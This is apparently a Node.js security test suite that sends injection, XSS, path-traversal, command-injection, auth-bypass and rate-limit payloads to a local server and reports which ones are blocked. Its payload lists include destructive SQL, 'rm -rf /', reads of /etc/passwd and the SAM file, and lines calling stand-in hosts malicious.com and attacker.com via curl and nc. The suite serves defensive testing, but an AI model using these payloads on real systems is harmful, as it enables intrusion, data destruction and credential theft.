

const axios = require('axios');
const fs = require('fs');
const path = require('path');

const BASE_URL = 'http://localhost:5000';
const RESULTS_FILE = path.join(__dirname, 'security-test-results.json');

class SecurityTester {
  constructor() {
    this.results = {
      timestamp: new Date().toISOString(),
      totalTests: 0,
      passed: 0,
      failed: 0,
      blocked: 0,
      tests: []
    };
  }

  log(message, level = 'info') {
    const colors = {
      info: '\x1b[36m',
      success: '\x1b[32m',
      error: '\x1b[31m',
      warn: '\x1b[33m',
      reset: '\x1b[0m'
    };
    console.log(`${colors[level]}${message}${colors.reset}`);
  }

  async recordTest(testName, category, fn) {
    this.log(`\n${'='.repeat(60)}`, 'info');
    this.log(`🧪 ${testName}`, 'info');
    this.log(`${'='.repeat(60)}`, 'info');
    
    this.results.totalTests++;
    const startTime = Date.now();
    
    try {
      const result = await fn();
      const duration = Date.now() - startTime;
      
      this.results.tests.push({
        name: testName,
        category,
        status: result.blocked ? 'blocked' : 'passed',
        duration,
        ...result
      });
      
      if (result.blocked) {
        this.results.blocked++;
        this.log(`🛡️  Request blocked (${duration}ms)`, 'warn');
      } else {
        this.results.passed++;
        this.log(`✅ Test passed (${duration}ms)`, 'success');
      }
      
      return result;
    } catch (error) {
      const duration = Date.now() - startTime;
      this.results.failed++;
      
      this.results.tests.push({
        name: testName,
        category,
        status: 'failed',
        duration,
        error: error.message
      });
      
      this.log(`❌ Test failed: ${error.message} (${duration}ms)`, 'error');
      return { failed: true, error: error.message };
    }
  }

  async makeRequest(config) {
    try {
      const response = await axios({
        ...config,
        validateStatus: () => true // Don't throw on any status
      });
      
      return {
        status: response.status,
        headers: response.headers,
        data: response.data,
        blocked: response.status === 403 || response.status === 429
      };
    } catch (error) {
      return {
        status: error.response?.status,
        error: error.message,
        blocked: error.response?.status === 403 || error.response?.status === 429
      };
    }
  }

  // ============ SQL INJECTION TESTS ============
  async testSQLInjection() {
    const payloads = [
      "1' OR '1'='1",
      "admin'--",
      "1' UNION SELECT NULL--",
      "'; DROP TABLE users--",
      "1' AND 1=1--",
      "admin' OR 1=1/*",
      "' OR 'x'='x",
      "1'; EXEC sp_MSForEachTable 'DROP TABLE ?'--"
    ];

    for (const payload of payloads) {
      await this.recordTest(
        `SQL Injection: ${payload.substring(0, 30)}...`,
        'injection',
        async () => {
          const result = await this.makeRequest({
            method: 'GET',
            url: `${BASE_URL}/api/users`,
            params: { id: payload }
          });
          
          this.log(`   Payload: ${payload}`, 'info');
          this.log(`   Status: ${result.status}`, result.blocked ? 'warn' : 'info');
          this.log(`   Security Headers: ${JSON.stringify(result.headers['x-security-status'])}`, 'info');
          
          return result;
        }
      );
    }
  }

  // ============ XSS TESTS ============
  async testXSS() {
    const payloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert(1)>',
      '<svg/onload=alert(1)>',
      'javascript:alert(1)',
      '<iframe src="javascript:alert(1)">',
      '<body onload=alert(1)>',
      '<input onfocus=alert(1) autofocus>',
      '"><script>alert(String.fromCharCode(88,83,83))</script>'
    ];

    for (const payload of payloads) {
      await this.recordTest(
        `XSS Attack: ${payload.substring(0, 30)}...`,
        'injection',
        async () => {
          const result = await this.makeRequest({
            method: 'POST',
            url: `${BASE_URL}/api/comment`,
            data: { comment: payload }
          });
          
          this.log(`   Payload: ${payload}`, 'info');
          this.log(`   Status: ${result.status}`, result.blocked ? 'warn' : 'info');
          
          return result;
        }
      );
    }
  }

  // ============ PATH TRAVERSAL TESTS ============
  async testPathTraversal() {
    const payloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '....\\\\....\\\\....\\\\windows\\\\system32'
    ];

    for (const payload of payloads) {
      await this.recordTest(
        `Path Traversal: ${payload}`,
        'injection',
        async () => {
          const result = await this.makeRequest({
            method: 'GET',
            url: `${BASE_URL}/api/file`,
            params: { path: payload }
          });
          
          this.log(`   Payload: ${payload}`, 'info');
          this.log(`   Status: ${result.status}`, result.blocked ? 'warn' : 'info');
          
          return result;
        }
      );
    }
  }

  // ============ COMMAND INJECTION TESTS ============
  async testCommandInjection() {
    const payloads = [
      '; ls -la',
      '| cat /etc/passwd',
      '& dir',
      '`whoami`',
      '$(curl malicious.com)',
      '; rm -rf /',
      '| nc attacker.com 4444'
    ];

    for (const payload of payloads) {
      await this.recordTest(
        `Command Injection: ${payload}`,
        'injection',
        async () => {
          const result = await this.makeRequest({
            method: 'POST',
            url: `${BASE_URL}/api/execute`,
            data: { command: payload }
          });
          
          this.log(`   Payload: ${payload}`, 'info');
          this.log(`   Status: ${result.status}`, result.blocked ? 'warn' : 'info');
          
          return result;
        }
      );
    }
  }

  // ============ RATE LIMITING TESTS ============
  async testBurstAttack() {
    await this.recordTest(
      'Burst Attack - 50 rapid requests',
      'rate-limit',
      async () => {
        const requests = [];
        const startTime = Date.now();
        
        for (let i = 0; i < 50; i++) {
          requests.push(this.makeRequest({
            method: 'GET',
            url: `${BASE_URL}/health`
          }));
        }
        
        const results = await Promise.all(requests);
        const duration = Date.now() - startTime;
        const blocked = results.filter(r => r.blocked).length;
        const passed = results.length - blocked;
        
        this.log(`   Duration: ${duration}ms`, 'info');
        this.log(`   Requests: ${results.length}`, 'info');
        this.log(`   Passed: ${passed}`, 'success');
        this.log(`   Blocked: ${blocked}`, 'warn');
        this.log(`   Rate: ${(results.length / (duration / 1000)).toFixed(2)} req/s`, 'info');
        
        return {
          blocked: blocked > 0,
          totalRequests: results.length,
          blockedCount: blocked,
          passedCount: passed,
          duration,
          requestsPerSecond: results.length / (duration / 1000)
        };
      }
    );
  }

  async testIPRateLimit() {
    await this.recordTest(
      'IP Rate Limit - 150 requests in 1 minute',
      'rate-limit',
      async () => {
        const results = [];
        let blocked = false;
        
        for (let i = 0; i < 150; i++) {
          const result = await this.makeRequest({
            method: 'GET',
            url: `${BASE_URL}/health`
          });
          
          results.push(result);
          
          if (result.blocked) {
            blocked = true;
            this.log(`   🛡️  Blocked at request #${i + 1}`, 'warn');
            break;
          }
          
          // Small delay to avoid overwhelming the server
          await new Promise(resolve => setTimeout(resolve, 10));
        }
        
        this.log(`   Total requests before block: ${results.length}`, 'info');
        
        return {
          blocked,
          requestsBeforeBlock: results.length
        };
      }
    );
  }

  async testEndpointSpam() {
    await this.recordTest(
      'Endpoint Spam - Same endpoint 40 times',
      'rate-limit',
      async () => {
        const results = [];
        
        for (let i = 0; i < 40; i++) {
          const result = await this.makeRequest({
            method: 'GET',
            url: `${BASE_URL}/api/sensitive-endpoint`
          });
          
          results.push(result);
          await new Promise(resolve => setTimeout(resolve, 50));
        }
        
        const blocked = results.filter(r => r.blocked).length;
        
        this.log(`   Total: ${results.length}`, 'info');
        this.log(`   Blocked: ${blocked}`, blocked > 0 ? 'warn' : 'info');
        
        return {
          blocked: blocked > 0,
          totalRequests: results.length,
          blockedCount: blocked
        };
      }
    );
  }

  // ============ MALFORMED REQUEST TESTS ============
  async testMalformedRequests() {
    const tests = [
      {
        name: 'Huge payload (10MB)',
        data: { payload: 'A'.repeat(10 * 1024 * 1024) }
      },
      {
        name: 'Invalid JSON',
        data: '{invalid json}',
        headers: { 'Content-Type': 'application/json' }
      },
      {
        name: 'Missing required headers',
        headers: { 'User-Agent': undefined }
      },
      {
        name: 'Malicious headers',
        headers: { 'X-Forwarded-For': '0.0.0.0; DROP TABLE users;' }
      }
    ];

    for (const test of tests) {
      await this.recordTest(
        `Malformed Request: ${test.name}`,
        'malformed',
        async () => {
          const result = await this.makeRequest({
            method: 'POST',
            url: `${BASE_URL}/api/data`,
            data: test.data,
            headers: test.headers
          });
          
          this.log(`   Test: ${test.name}`, 'info');
          this.log(`   Status: ${result.status}`, result.blocked ? 'warn' : 'info');
          
          return result;
        }
      );
    }
  }

  // ============ AUTHENTICATION BYPASS TESTS ============
  async testAuthBypass() {
    const tests = [
      { name: 'SQL in username', data: { username: "admin'--", password: 'any' } },
      { name: 'NoSQL injection', data: { username: { $ne: null }, password: { $ne: null } } },
      { name: 'Empty credentials', data: { username: '', password: '' } },
      { name: 'Null bytes', data: { username: 'admin\x00', password: 'pass' } }
    ];

    for (const test of tests) {
      await this.recordTest(
        `Auth Bypass: ${test.name}`,
        'authentication',
        async () => {
          const result = await this.makeRequest({
            method: 'POST',
            url: `${BASE_URL}/api/auth/login`,
            data: test.data
          });
          
          this.log(`   Attempt: ${test.name}`, 'info');
          this.log(`   Status: ${result.status}`, result.blocked ? 'warn' : 'info');
          
          return result;
        }
      );
    }
  }

  // ============ DOWNLOAD ABUSE TESTS ============
  async testDownloadAbuse() {
    await this.recordTest(
      'Download Abuse - 15 rapid downloads',
      'abuse',
      async () => {
        const results = [];
        
        for (let i = 0; i < 15; i++) {
          const result = await this.makeRequest({
            method: 'GET',
            url: `${BASE_URL}/api/download/file.pdf`
          });
          
          results.push(result);
          await new Promise(resolve => setTimeout(resolve, 100));
        }
        
        const blocked = results.filter(r => r.blocked).length;
        
        this.log(`   Downloads attempted: ${results.length}`, 'info');
        this.log(`   Blocked: ${blocked}`, blocked > 0 ? 'warn' : 'info');
        
        return {
          blocked: blocked > 0,
          totalDownloads: results.length,
          blockedCount: blocked
        };
      }
    );
  }

  // ============ COMBINED ATTACK TESTS ============
  async testCombinedAttacks() {
    await this.recordTest(
      'Combined Attack - XSS + SQL + Path Traversal',
      'combined',
      async () => {
        const result = await this.makeRequest({
          method: 'POST',
          url: `${BASE_URL}/api/search`,
          data: {
            query: "' OR 1=1--",
            filter: '<script>alert(1)</script>',
            path: '../../../etc/passwd'
          }
        });
        
        this.log(`   Multi-vector attack detected`, 'warn');
        this.log(`   Status: ${result.status}`, result.blocked ? 'warn' : 'info');
        
        return result;
      }
    );
  }

  // ============ GENERATE REPORT ============
  generateReport() {
    this.log('\n\n' + '='.repeat(60), 'info');
    this.log('📊 SECURITY TEST RESULTS', 'info');
    this.log('='.repeat(60), 'info');
    
    this.log(`\n📈 Summary:`, 'info');
    this.log(`   Total Tests: ${this.results.totalTests}`, 'info');
    this.log(`   Passed: ${this.results.passed}`, 'success');
    this.log(`   Blocked: ${this.results.blocked}`, 'warn');
    this.log(`   Failed: ${this.results.failed}`, this.results.failed > 0 ? 'error' : 'info');
    
    const successRate = ((this.results.passed + this.results.blocked) / this.results.totalTests * 100).toFixed(2);
    this.log(`   Success Rate: ${successRate}%`, successRate > 90 ? 'success' : 'warn');
    
    // Group by category
    const byCategory = {};
    this.results.tests.forEach(test => {
      if (!byCategory[test.category]) {
        byCategory[test.category] = { total: 0, passed: 0, blocked: 0, failed: 0 };
      }
      byCategory[test.category].total++;
      byCategory[test.category][test.status]++;
    });
    
    this.log(`\n📁 Results by Category:`, 'info');
    Object.entries(byCategory).forEach(([category, stats]) => {
      this.log(`\n   ${category.toUpperCase()}:`, 'info');
      this.log(`      Total: ${stats.total}`, 'info');
      this.log(`      Passed: ${stats.passed}`, 'success');
      this.log(`      Blocked: ${stats.blocked}`, 'warn');
      this.log(`      Failed: ${stats.failed}`, stats.failed > 0 ? 'error' : 'info');
    });
    
    // Save to file
    fs.writeFileSync(RESULTS_FILE, JSON.stringify(this.results, null, 2));
    this.log(`\n💾 Detailed results saved to: ${RESULTS_FILE}`, 'success');
    
    this.log('\n' + '='.repeat(60) + '\n', 'info');
  }

  // ============ RUN ALL TESTS ============
  async runAllTests() {
    this.log('🚀 Starting Advanced Security Test Suite', 'info');
    this.log(`Target: ${BASE_URL}`, 'info');
    this.log(`Time: ${new Date().toLocaleString()}\n`, 'info');

    await this.testSQLInjection();
    await this.testXSS();
    await this.testPathTraversal();
    await this.testCommandInjection();
    await this.testBurstAttack();
    await this.testIPRateLimit();
    await this.testEndpointSpam();
    await this.testMalformedRequests();
    await this.testAuthBypass();
    await this.testDownloadAbuse();
    await this.testCombinedAttacks();

    this.generateReport();
  }
}

// Run tests
const tester = new SecurityTester();
tester.runAllTests().catch(err => {
  console.error('Test suite failed:', err);
  process.exit(1);
});